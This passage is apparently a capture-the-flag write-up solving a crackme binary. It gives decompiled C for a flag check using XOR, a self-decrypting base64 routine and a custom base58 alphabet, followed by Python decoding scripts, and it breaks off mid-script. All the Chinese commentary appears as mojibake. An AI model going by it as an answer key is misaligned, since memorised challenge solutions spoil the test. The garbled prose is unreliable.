</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"> <span class="n">Str2</span> <span class="o">=</span> <span class="s">&#34;tHMoSoMX71sm62ARQ8aHF6i88nhkH9Ac2J7CrkQsQgXpiy6efoC8YVkzZu1tMyFxCLbbqvgXZHxtwK5TACVhPi1EE5mK6JG56wPNR4d2GmkELGfJHgtcAEH7&#34;</span><span class="p">;</span>   <span class="c1">//çŒœæµ‹å¯èƒ½æ˜¯å¯†æ–‡
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;Plz input your flag miao: &#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="n">v3</span> <span class="o">=</span> <span class="nf">__acrt_iob_func</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="nf">fgets</span><span class="p">(</span><span class="n">Buffer</span><span class="p">,</span> <span class="mi">1024</span><span class="p">,</span> <span class="n">v3</span><span class="p">);</span><span class="c1">//è¾“å…¥
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="n">Buffer</span><span class="p">[</span><span class="nf">strcspn</span><span class="p">(</span><span class="n">Buffer</span><span class="p">,</span> <span class="s">&#34;</span><span class="se">\r\n</span><span class="s">&#34;</span><span class="p">)]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="n">hex</span> <span class="o">=</span> <span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="nf">ascii_to_hexbytes</span><span class="p">(</span><span class="n">Buffer</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">outlen</span><span class="p">);</span><span class="c1">//è¿™ä¸ªå‡½æ•°æŠŠè¾“å…¥çš„ ASCII å­—ç¬¦ä¸² s çš„æ¯ä¸ªå­—èŠ‚è½¬æ¢ä¸ºä¸¤ä¸ªå¤§å†™åå…­è¿›åˆ¶ ASCII å­—ç¬¦
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="n">data</span> <span class="o">=</span> <span class="nf">hexstr_to_bytes</span><span class="p">(</span><span class="n">hex</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">len</span><span class="p">);</span><span class="c1">//è¿™ä¸ªå‡½æ•°æŠŠä¸€ä¸ªåå…­è¿›åˆ¶å­—ç¬¦å­—ç¬¦ä¸²ï¼ˆå¦‚ &#34;4869&#34;ï¼‰æ¯ä¸¤ä¸ªå­—ç¬¦è§£æä¸ºä¸€ä¸ªå­—èŠ‚
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="n">key</span> <span class="o">=</span> <span class="mi">17</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="nf">init</span><span class="p">(</span><span class="o">&amp;</span><span class="n">ctx</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">key</span><span class="p">,</span> <span class="mi">1</span><span class="p">);</span><span class="c1">//è¿›å»è§‚å¯Ÿå¯çŸ¥ï¼Œè¯¥å‡½æ•°æ ¹æ®keyåˆå§‹åŒ–äº†ä¸€ä¸ªrc4çš„sè¡¨
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="nf">encode</span><span class="p">(</span><span class="o">&amp;</span><span class="n">ctx</span><span class="p">,</span> <span class="n">data</span><span class="p">,</span> <span class="n">len</span><span class="p">);</span><span class="c1">//è¿›å…¥å‡½æ•°å‘ç°ï¼Œè¯¥å‡½æ•°æ˜¯ç®€å•çš„å¼‚æˆ–æœºå¯†ï¼Œå¯†æ–‡æ˜¯åˆšæ‰åˆå§‹åŒ–çš„sè¡¨
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="n">Str</span> <span class="o">=</span> <span class="nf">bytes_to_hexstr</span><span class="p">(</span><span class="n">data</span><span class="p">,</span> <span class="n">len</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="nf">miao_encrypt</span><span class="p">();</span><span class="c1">//å†…å­˜åŠ å¯†å‡½æ•°
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="n">v4</span> <span class="o">=</span> <span class="nf">strlen</span><span class="p">(</span><span class="n">Str</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="n">v13</span> <span class="o">=</span> <span class="p">(</span><span class="kt">uint8_t</span> <span class="o">*</span><span class="p">)</span><span class="nf">encodee</span><span class="p">((</span><span class="k">const</span> <span class="kt">uint8_t</span> <span class="o">*</span><span class="p">)</span><span class="n">Str</span><span class="p">,</span> <span class="n">v4</span><span class="p">);</span><span class="c1">//è¿›å…¥å‡½æ•°å‘ç°ï¼Œå­˜åœ¨æ— æ³•ç¼–è¯‘çš„æƒ…å†µï¼Œéœ€è¦è§£å†³
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="k">if</span> <span class="p">(</span> <span class="n">v13</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">  <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="n">v6</span> <span class="o">=</span> <span class="nf">strlen</span><span class="p">((</span><span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="n">v13</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="n">Str1</span> <span class="o">=</span> <span class="nf">enc0de</span><span class="p">(</span><span class="n">v13</span><span class="p">,</span> <span class="n">v6</span><span class="p">);</span><span class="c1">//è¿›å…¥æŸ¥çœ‹ï¼Œä¸ºbase58åŠ å¯†ï¼Œé¡ºæ‰‹æŸ¥çœ‹æ˜ å°„è¡¨
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="c1">//ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz123456789
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="k">if</span> <span class="p">(</span> <span class="o">!</span><span class="nf">strcmp</span><span class="p">(</span><span class="n">Str1</span><span class="p">,</span> <span class="n">Str2</span><span class="p">)</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">      <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;Correct!&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">else</span>
</span></span><span class="line"><span class="cl">      <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;Wrong!&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">free</span><span class="p">(</span><span class="n">hex</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">free</span><span class="p">(</span><span class="n">data</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">free</span><span class="p">(</span><span class="n">Str</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">free</span><span class="p">(</span><span class="n">v13</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">free</span><span class="p">(</span><span class="n">Str1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="k">else</span>
</span></span><span class="line"><span class="cl">  <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;encodee returned NULL&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><ul>
<li>ä¸‹ä¸€æ­¥åªéœ€è¦é€šè¿‡åŠ¨æ€è°ƒè¯•è§£å¯†å‡ºæ­£ç¡®çš„åŠ å¯†å‡½æ•°å³å¯å¾—åˆ°åŠ å¯†è¿‡ç¨‹</li>
<li>åªéœ€åœ¨ä»£ç åŠ å¯†å‡½æ•°è¿è¡Œä¹‹åä¸‹ä¸ªæ–­ç‚¹ï¼Œå†æŸ¥çœ‹<code>encodee</code>å‘ç°å†…å®¹å‡ºç°äº†å˜åŒ–</li>
</ul>
<p>æœªè§£å¯†ä»£ç </p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">          db  8Eh
</span></span><span class="line"><span class="cl">.miao:00000000004A2013                 db  4Bh ; K
</span></span><span class="line"><span class="cl">.miao:00000000004A2014                 db    1
</span></span><span class="line"><span class="cl">.miao:00000000004A2015                 db 0B9h
</span></span><span class="line"><span class="cl">.miao:00000000004A2016                 db  55h ; U
</span></span><span class="line"><span class="cl">.miao:00000000004A2017                 db  56h ; V
</span></span><span class="line"><span class="cl">.miao:00000000004A2018                 db  56h ; V
</span></span><span class="line"><span class="cl">.miao:00000000004A2019                 db  56h ; V
</span></span></code></pre></td></tr></table>
</div>
</div><p>è§£å¯†åä»£ç </p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">db  8Dh
</span></span><span class="line"><span class="cl">.miao:00000000004A2013 db  48h ; H
</span></span><span class="line"><span class="cl">.miao:00000000004A2014 db    2
</span></span><span class="line"><span class="cl">.miao:00000000004A2015 db 0BAh
</span></span><span class="line"><span class="cl">.miao:00000000004A2016 db  56h ; V
</span></span><span class="line"><span class="cl">.miao:00000000004A2017 db  55h ; U
</span></span><span class="line"><span class="cl">.miao:00000000004A2018 db  55h ; U
</span></span><span class="line"><span class="cl">.miao:00000000004A2019 db  55h ; U
</span></span></code></pre></td></tr></table>
</div>
</div><p>ä¿®å¤ä¹‹åçš„<code>encodee</code></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">char</span> <span class="o">*</span><span class="kr">__cdecl</span> <span class="nf">encodee</span><span class="p">(</span><span class="k">const</span> <span class="kt">uint8_t</span> <span class="o">*</span><span class="n">buf</span><span class="p">,</span> <span class="kt">int</span> <span class="n">len</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="kt">int</span> <span class="n">v3</span><span class="p">;</span> <span class="c1">// eax
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">char</span> <span class="n">v4</span><span class="p">;</span> <span class="c1">// al
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">int</span> <span class="n">v5</span><span class="p">;</span> <span class="c1">// edx
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">char</span> <span class="n">v6</span><span class="p">;</span> <span class="c1">// al
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">int</span> <span class="n">v7</span><span class="p">;</span> <span class="c1">// edx
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">char</span> <span class="o">*</span><span class="n">v8</span><span class="p">;</span> <span class="c1">// [rsp+28h] [rbp-18h]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">v9</span><span class="p">;</span> <span class="c1">// [rsp+34h] [rbp-Ch]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">int</span> <span class="n">i</span><span class="p">;</span> <span class="c1">// [rsp+38h] [rbp-8h]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">int</span> <span class="n">v11</span><span class="p">;</span> <span class="c1">// [rsp+3Ch] [rbp-4h]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">int</span> <span class="n">v12</span><span class="p">;</span> <span class="c1">// [rsp+3Ch] [rbp-4h]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">int</span> <span class="n">v13</span><span class="p">;</span> <span class="c1">// [rsp+3Ch] [rbp-4h]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl">  <span class="n">v8</span> <span class="o">=</span> <span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="nf">malloc</span><span class="p">(</span><span class="mi">4</span> <span class="o">*</span> <span class="p">((</span><span class="n">len</span> <span class="o">+</span> <span class="mi">2</span><span class="p">)</span> <span class="o">/</span> <span class="mi">3</span><span class="p">)</span> <span class="o">+</span> <span class="mi">1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span> <span class="o">!</span><span class="n">v8</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="mi">0LL</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="n">v11</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="k">for</span> <span class="p">(</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">len</span><span class="p">;</span> <span class="n">i</span> <span class="o">+=</span> <span class="mi">3</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">  <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="n">v9</span> <span class="o">=</span> <span class="n">buf</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">&lt;&lt;</span> <span class="mi">16</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span> <span class="n">len</span> <span class="o">&gt;</span> <span class="n">i</span> <span class="o">+</span> <span class="mi">1</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">      <span class="n">v9</span> <span class="o">|=</span> <span class="n">buf</span><span class="p">[</span><span class="n">i</span> <span class="o">+</span> <span class="mi">1</span><span class="p">]</span> <span class="o">&lt;&lt;</span> <span class="mi">8</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span> <span class="n">len</span> <span class="o">&gt;</span> <span class="n">i</span> <span class="o">+</span> <span class="mi">2</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">      <span class="n">v9</span> <span class="o">|=</span> <span class="n">buf</span><span class="p">[</span><span class="n">i</span> <span class="o">+</span> <span class="mi">2</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">    <span class="n">v8</span><span class="p">[</span><span class="n">v11</span><span class="p">]</span> <span class="o">=</span> <span class="nf">encodee</span><span class="p">(</span><span class="kt">unsigned</span> <span class="kt">char</span> <span class="k">const</span><span class="o">*</span><span class="p">,</span><span class="kt">int</span><span class="p">)</span><span class="o">::</span><span class="n">base64_table</span><span class="p">[(</span><span class="n">v9</span> <span class="o">&gt;&gt;</span> <span class="mi">18</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0x3F</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">    <span class="n">v3</span> <span class="o">=</span> <span class="n">v11</span> <span class="o">+</span> <span class="mi">1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">v12</span> <span class="o">=</span> <span class="n">v11</span> <span class="o">+</span> <span class="mi">2</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">v8</span><span class="p">[</span><span class="n">v3</span><span class="p">]</span> <span class="o">=</span> <span class="nf">encodee</span><span class="p">(</span><span class="kt">unsigned</span> <span class="kt">char</span> <span class="k">const</span><span class="o">*</span><span class="p">,</span><span class="kt">int</span><span class="p">)</span><span class="o">::</span><span class="n">base64_table</span><span class="p">[(</span><span class="n">v9</span> <span class="o">&gt;&gt;</span> <span class="mi">12</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0x3F</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span> <span class="n">len</span> <span class="o">&lt;=</span> <span class="n">i</span> <span class="o">+</span> <span class="mi">1</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">      <span class="n">v4</span> <span class="o">=</span> <span class="mi">61</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">else</span>
</span></span><span class="line"><span class="cl">      <span class="n">v4</span> <span class="o">=</span> <span class="nf">encodee</span><span class="p">(</span><span class="kt">unsigned</span> <span class="kt">char</span> <span class="k">const</span><span class="o">*</span><span class="p">,</span><span class="kt">int</span><span class="p">)</span><span class="o">::</span><span class="n">base64_table</span><span class="p">[(</span><span class="n">v9</span> <span class="o">&gt;&gt;</span> <span class="mi">6</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0x3F</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">    <span class="n">v5</span> <span class="o">=</span> <span class="n">v12</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">v13</span> <span class="o">=</span> <span class="n">v12</span> <span class="o">+</span> <span class="mi">1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">v8</span><span class="p">[</span><span class="n">v5</span><span class="p">]</span> <span class="o">=</span> <span class="n">v4</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span> <span class="n">len</span> <span class="o">&lt;=</span> <span class="n">i</span> <span class="o">+</span> <span class="mi">2</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">      <span class="n">v6</span> <span class="o">=</span> <span class="mi">61</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">else</span>
</span></span><span class="line"><span class="cl">      <span class="n">v6</span> <span class="o">=</span> <span class="nf">encodee</span><span class="p">(</span><span class="kt">unsigned</span> <span class="kt">char</span> <span class="k">const</span><span class="o">*</span><span class="p">,</span><span class="kt">int</span><span class="p">)</span><span class="o">::</span><span class="n">base64_table</span><span class="p">[</span><span class="n">v9</span> <span class="o">&amp;</span> <span class="mh">0x3F</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">    <span class="n">v7</span> <span class="o">=</span> <span class="n">v13</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">v11</span> <span class="o">=</span> <span class="n">v13</span> <span class="o">+</span> <span class="mi">1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">v8</span><span class="p">[</span><span class="n">v7</span><span class="p">]</span> <span class="o">=</span> <span class="n">v6</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="n">v8</span><span class="p">[</span><span class="n">v11</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="n">v8</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>å¯çŸ¥æ˜¯ä¸€ä¸ªbase64åŠ å¯†</p>
<ul>
<li>
<p>åŠ å¯†è¿‡ç¨‹input&mdash;&gt;ä¸sè¡¨å¼‚æˆ–&mdash;-&gt;bsae64åŠ å¯†&mdash;&ndash;&gt;base58åŠ å¯†</p>
</li>
<li>
<p>è§£å¯†è¿‡ç¨‹å¯†æ–‡&mdash;&gt;base58è§£å¯†&mdash;-&gt;base64è§£å¯†&mdash;-&gt;ä¸sè¡¨å¼‚æˆ–</p>
</li>
<li>
<p>bae58è§£å¯†</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">base58</span>  <span class="c1"># è¿™ä¸ªåº“é»˜è®¤ç”¨æ ‡å‡†è¡¨ï¼Œæ‰€ä»¥æˆ‘ä»¬è¦è‡ªå®šä¹‰æ˜ å°„</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># ä½ çš„è‡ªå®šä¹‰ Base58 å­—æ¯è¡¨</span>
</span></span><span class="line"><span class="cl"><span class="n">CUSTOM_B58</span> <span class="o">=</span> <span class="s2">&#34;ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz123456789&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># æ ‡å‡† Base58 å­—æ¯è¡¨ï¼ˆbase58.b58decode ç”¨çš„ï¼‰</span>
</span></span><span class="line"><span class="cl"><span class="n">STANDARD_B58</span> <span class="o">=</span> <span class="s2">&#34;123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># ç¼–ç åçš„å­—ç¬¦ä¸²</span>
</span></span><span class="line"><span class="cl"><span class="n">encoded</span> <span class="o">=</span> <span class="s2">&#34;tHMoSoMX71sm62ARQ8aHF6i88nhkH9Ac2J7CrkQsQgXpiy6efoC8YVkzZu1tMyFxCLbbqvgXZHxtwK5TACVhPi1EE5mK6JG56wPNR4d2GmkELGfJHgtcAEH7&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># å°†è‡ªå®šä¹‰è¡¨çš„å­—ç¬¦æ˜ å°„åˆ°æ ‡å‡†è¡¨</span>
</span></span><span class="line"><span class="cl"><span class="c1"># æ–¹æ³•ï¼šæ„å»ºä¸€ä¸ªä» è‡ªå®šä¹‰å­—ç¬¦ -&gt; æ ‡å‡†å­—ç¬¦ çš„æ˜ å°„</span>
</span></span><span class="line"><span class="cl"><span class="n">trans</span> <span class="o">=</span> <span class="nb">str</span><span class="o">.</span><span class="n">maketrans</span><span class="p">(</span><span class="n">CUSTOM_B58</span><span class="p">,</span> <span class="n">STANDARD_B58</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">encoded_std</span> <span class="o">=</span> <span class="n">encoded</span><span class="o">.</span><span class="n">translate</span><span class="p">(</span><span class="n">trans</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># ç”¨æ ‡å‡†åº“è§£ç </span>
</span></span><span class="line"><span class="cl"><span class="n">decoded_bytes</span> <span class="o">=</span> <span class="n">base58</span><span class="o">.</span><span class="n">b58decode</span><span class="p">(</span><span class="n">encoded_std</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># è¾“å‡ºåå…­è¿›åˆ¶å’Œå°è¯•è½¬ä¸ºå­—ç¬¦ä¸²</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="s2">&#34;è§£ç åçš„å­—èŠ‚ (hex):&#34;</span><span class="p">,</span> <span class="n">decoded_bytes</span><span class="o">.</span><span class="n">hex</span><span class="p">())</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># å°è¯•è½¬ä¸º ASCII å­—ç¬¦ä¸²ï¼ˆå¦‚æœæ˜¯æ–‡æœ¬çš„è¯ï¼‰</span>
</span></span><span class="line"><span class="cl"><span class="k">try</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="n">text</span> <span class="o">=</span> <span class="n">decoded_bytes</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s1">&#39;utf-8&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;è§£ç åçš„å­—ç¬¦ä¸²:&#34;</span><span class="p">,</span> <span class="n">text</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="k">except</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;ä¸æ˜¯æœ‰æ•ˆçš„ UTF-8 æ–‡æœ¬&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">#ç”±è¿è¡Œç»“æœå¯å¾—#ZGZkMjRjNmMzM2JlZWUyYjQ5MzI5ZTYxMTg2MDEyYjA1ZGExNTQyZGQzZjA5ZmIwZTlhZWQzMzBjOD#c0NzdjYw==</span>
</span></span></code></pre></td></tr></table>
</div>
</div></li>
<li>
<p>base64è§£å¯†</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">base64</span> 
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="s2">&#34;ç¼–ç  1 è§£ç  2&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">x</span><span class="o">=</span><span class="nb">int</span><span class="p">(</span><span class="nb">input</span><span class="p">())</span>
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="n">x</span><span class="o">==</span><span class="mi">1</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="n">s</span><span class="o">=</span><span class="nb">input</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">((</span><span class="n">base64</span><span class="o">.</span><span class="n">b64encode</span><span class="p">(</span><span class="n">s</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s1">&#39;utf-8&#39;</span><span class="p">)))</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s1">&#39;utf-8&#39;</span><span class="p">))</span>
</span></span><span class="line"><span class="cl"><span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="n">s</span><span class="o">=</span><span class="nb">input</span><span class="p">()</span>
